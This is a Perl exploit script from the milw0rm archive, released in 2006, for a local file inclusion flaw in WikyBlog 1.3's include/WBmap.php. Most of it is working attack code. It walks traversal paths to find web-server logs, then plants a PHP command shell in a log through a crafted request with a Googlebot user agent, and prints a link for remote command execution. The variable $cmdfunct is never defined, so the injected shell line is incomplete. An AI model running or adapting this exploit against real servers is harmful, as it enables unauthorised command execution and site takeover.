<html><head><title>WikyBlog 1.3.2 (include/WBmap.php) Local File Inclusion Exploit</title></head><pre>#################################################################################################
#                                    r0ut3r Presents...                                         #
#                                                                                               #
#                                Another r0ut3r discovery!                                      #
#                                  writ3r [at] gmail.com                                        #
#                                                                                               #
#                          WikyBlog Local File Inclusion Exploit                                #
#################################################################################################
# Software: WikyBlog 1.3                                                                        #
#                                                                                               #
# Vendor: http://www.wikyblog.com/                                                              #
#                                                                                               #
# Released: 2006/12/01                                                                          #
#                                                                                               #
# Discovered &amp; Exploit By: r0ut3r (writ3r [at] gmail.com)                                       #
#                                                                                               #
# Note: The information provided in this document is for WikyBlog administrator                 #
# testing purposes only!                                                                        #
#                                                                                               #
# This exploit makes use of a local file inclusion exploit in                                   #
# WikyBlog to allow command execution. Firstly it locates an                                    #
# access_log, or error_log then it inserts a PHP Shell into                                     #
# the log file and returns a link for command execution.                                        #
#                                                                                               #
# include/WBmap.php?l=file_to_include%00                                                        #
# register_globals being on does not affect this vulnerability                                  #
#################################################################################################

use IO::Socket;
use Switch;

$port = &quot;80&quot;; # connection port
$target = @ARGV[0]; # localhost
$folder = @ARGV[1]; # /wikyblog/

sub Header()
{
        print q {#################################################################################################
#                                    r0ut3r Presents...                                         #
#                                                                                               #
#                                Another r0ut3r discovery!                                      #
#                                  writ3r [at] gmail.com                                        #
#                                                                                               #
#                          WikyBlog Local File Inclusion Exploit                                #
#################################################################################################
};
}

sub Usage()
{
        print q {Usage: wikyblogxpl1.3.pl [target] [folder]
Example: wikyblogxpl1.3.pl localhost /wikyblog/
};
        exit();
}

Header();

if (!$target || !$folder) {
        Usage(); }

# log list taken from Kacper's http://www.milw0rm.com/exploits/2253
@paths=(
&quot;../../../../../var/log/httpd/access_log&quot;,
&quot;../../../../../var/log/httpd/error_log&quot;,
&quot;../apache/logs/error.log&quot;,
&quot;../apache/logs/access.log&quot;,
&quot;../../apache/logs/error.log&quot;,
&quot;../../apache/logs/access.log&quot;,
&quot;../../../apache/logs/error.log&quot;,
&quot;../../../apache/logs/access.log&quot;,
&quot;../../../../apache/logs/error.log&quot;,
&quot;../../../../apache/logs/access.log&quot;,
&quot;../../../../../apache/logs/error.log&quot;,
&quot;../../../../../apache/logs/access.log&quot;,
&quot;../logs/error.log&quot;,
&quot;../logs/access.log&quot;,
&quot;../../logs/error.log&quot;,
&quot;../../logs/access.log&quot;,
&quot;../../../logs/error.log&quot;,
&quot;../../../logs/access.log&quot;,
&quot;../../../../logs/error.log&quot;,
&quot;../../../../logs/access.log&quot;,
&quot;../../../../../logs/error.log&quot;,
&quot;../../../../../logs/access.log&quot;,
&quot;../../../../../etc/httpd/logs/access_log&quot;,
&quot;../../../../../etc/httpd/logs/access.log&quot;,
&quot;../../../../../etc/httpd/logs/error_log&quot;,
&quot;../../../../../etc/httpd/logs/error.log&quot;,
&quot;../../../../../var/www/logs/access_log&quot;,
&quot;../../../../../var/www/logs/access.log&quot;,
&quot;../../../../../usr/local/apache/logs/access_log&quot;,
&quot;../../../../../usr/local/apache/logs/access.log&quot;,
&quot;../../../../../var/log/apache/access_log&quot;,
&quot;../../../../../var/log/apache/access.log&quot;,
&quot;../../../../../var/log/access_log&quot;,
&quot;../../../../../var/www/logs/error_log&quot;,
&quot;../../../../../var/www/logs/error.log&quot;,
&quot;../../../../../usr/local/apache/logs/error_log&quot;,
&quot;../../../../../usr/local/apache/logs/error.log&quot;,
&quot;../../../../../var/log/apache/error_log&quot;,
&quot;../../../../../var/log/apache/error.log&quot;,
&quot;../../../../../var/log/access_log&quot;,
&quot;../../../../../var/log/error_log&quot;
);

print &quot;[+] Attempting to locate log file\n&quot;;
$log = &quot;&quot;;
foreach $path (@paths)
{
        $sock = IO::Socket::INET-&gt;new(Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; $target, PeerPort =&gt; $port) || die &quot;[-] Failed to connect. Exiting...\r\n&quot;;
        print $sock &quot;GET &quot;.$folder.&quot;include/WBmap.php?l=&quot;.$path.&quot;%00 HTTP/1.1\n&quot;;
        print $sock &quot;Host: $target\n&quot;;
        print $sock &quot;User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\n&quot;;
        print $sock &quot;Accept: text/html\n&quot;;
        print $sock &quot;Connection: close\n\n\r\n&quot;;

        #locate log file part taken from Kacper's http://www.milw0rm.com/exploits/2253
        $out = &quot;&quot;;
        while ($answer = &lt;$sock&gt;) {
                $out.=$answer; }
        close($sock);
        if ($out =~ m/_exppl_(.*?)_exppl_/ms) {
                print &quot;[+] Log file found! [&quot;.$path.&quot;] \n&quot;;
                $log = $path; }
}

if ($log eq &quot;&quot;) {
print &quot;[-] Log file not found. Exiting...\n&quot;; exit(); }

print &quot;[+] Inserting PHP Shell into logs\n&quot;;
$code = &quot;&lt;?php ob_clean(); echo &quot;.$cmdfunct.&quot;(\$_GET['cmd']); die(); ?&gt;&quot;;
$xpl = IO::Socket::INET-&gt;new(Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; $target, PeerPort =&gt; $port) || die &quot;[-] Failed to connect. Exiting...\r\n&quot;;
print $xpl &quot;GET /&quot;.$code.&quot; HTTP/1.1\n&quot;;
print $xpl &quot;Host: $target\n&quot;;
print $xpl &quot;User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\n&quot;;
print $xpl &quot;Accept: text/html\n&quot;;
print $xpl &quot;Connection: close\n\n\r\n&quot;;
print &quot;[+] Sent code...\n&quot;;

print &quot;[!] Command execution at: &quot;.$target.$folder.&quot;include/WBmap.php?l=&quot;.$log.&quot;%00&quot;;

# milw0rm.com [2006-12-01]</pre></html>